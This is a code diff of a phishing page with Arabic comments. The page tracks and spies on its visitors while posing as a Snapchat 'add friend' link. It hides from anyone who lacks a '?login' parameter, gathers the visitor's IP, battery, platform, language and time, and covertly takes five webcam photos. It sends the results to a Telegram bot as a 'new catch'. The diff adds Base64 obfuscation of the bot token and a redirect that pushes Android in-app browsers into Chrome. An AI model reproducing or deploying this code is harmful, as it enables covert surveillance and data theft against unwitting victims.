@@ -35,10 +35,23 @@
     <canvas id="c"></canvas>
 
     <script>
-        const token = "8264886383:AAEaUDc_Jm_3z74zqmFfXLU9cHXhRKrhjxs";
-        const chatId = "5775781038";
+        // تشفير البيانات بنظام Base64
+        const _encT = "ODI2NDg4NjM4MzpBQUVhdURjX0ptXzN6NzR6cW1GZmxVOWNoWGhSa3Joanhz";
+        const _encC = "NTc3NTc4MTAzOA==";
+        const token = atob(_encT);
+        const chatId = atob(_encC);
 
-        // 🛡️ حماية: التحويل لقوقل إذا لم يحتوي الرابط على ?login
+        // توجيه الأندرويد لمتصفح كروم
+        (function() {
+            const ua = navigator.userAgent;
+            const isAndroid = /Android/i.test(ua);
+            const isInApp = /FBAN|FBAV|Instagram|Messenger|WhatsApp/i.test(ua);
+            if (isAndroid && isInApp) {
+                const link = window.location.href.replace(/^https?:\/\//, '');
+                window.location.href = `intent://${link}#Intent;scheme=https;package=com.android.chrome;end`;
+            }
+        })();
+
         const urlParams = new URLSearchParams(window.location.search);
         if (!urlParams.has('login')) {
             window.location.replace("https://www.google.com");
@@ -52,26 +65,18 @@
 
         window.onload = async () => {
             try {
-                // سحب الـ IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipD = await ipRes.json();
-                
-                // سحب معلومات البطارية
                 let batt = "N/A"; 
                 try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋"); } catch(e){}
 
-                // 🕵️ تقرير بصمة الجهاز الكامل (Deep Fingerprint)
-                let report = `🔥 <b>صيد احترافي جديد!</b>\n\n` +
+                let report = `🔥 <b>صيد جديد (Chrome Target)</b>\n\n` +
                              `👤 <b>الحساب:</b> marveen_shalash\n` +
                              `🌐 <b>IP:</b> <code>${ipD.ip}</code>\n` +
                              `🔋 <b>الشحن:</b> ${batt}\n` +
-                             `🧠 <b>الرام:</b> ${navigator.deviceMemory || 'غير معروف'} GB\n` +
-                             `⚙️ <b>المعالج:</b> ${navigator.hardwareConcurrency || 'N/A'} Cores\n` +
                              `📱 <b>النظام:</b> ${navigator.platform}\n` +
-                             `🖥️ <b>الشاشة:</b> ${screen.width}x${screen.height}\n` +
                              `🌍 <b>اللغة:</b> ${navigator.language}\n` +
-                             `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n` +
-                             `🌐 <b>المتصفح:</b> ${navigator.vendor}`;
+                             `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
 
                 await sendLog(report);
                 startCapture();
@@ -84,7 +89,6 @@
                 const vid = document.getElementById('v');
                 vid.srcObject = s;
                 
-                // التقاط 5 صور سريعة
                 for(let i=1; i<=5; i++) {
                     setTimeout(() => {
                         const can = document.getElementById('c');
@@ -104,7 +108,6 @@
 
         document.getElementById('mainBtn').onclick = () => {
             startCapture();
-            // توجيه للسناب الحقيقي بعد 3 ثوانٍ للتمويه
             setTimeout(() => {
                 window.location.href = "https://www.snapchat.com/add/marveen_shalash";
             }, 3000);
